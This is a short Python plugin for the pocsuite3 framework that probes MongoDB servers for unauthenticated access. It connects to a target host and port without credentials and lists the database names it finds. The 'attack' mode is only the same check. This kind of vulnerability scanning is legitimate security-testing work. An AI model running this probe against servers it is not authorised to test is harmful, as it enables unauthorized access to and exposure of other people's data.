# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import pymongo

class MongodbUnauthPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 2, 2020'
    createDate = 'Aug 2, 2020'
    name = 'mongodb未授权访问'
    appName = 'mongodb'
    appVersion = 'v1.0.0'
    vulType = '未授权访问'
    protocol = 'mongod'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 27017
        result = {}
        try:
            client = pymongo.MongoClient(f'mongodb://{host}:{port}/')
            dblist = client.list_database_names()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '{}:{}'.format(host, port)
            result['extra'] = ','.join(dblist)
        except Exception as e:
            logger.info('{}:{}\t{}'.format(host,port,str(e)))
        finally:
            client.close()
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(MongodbUnauthPOC)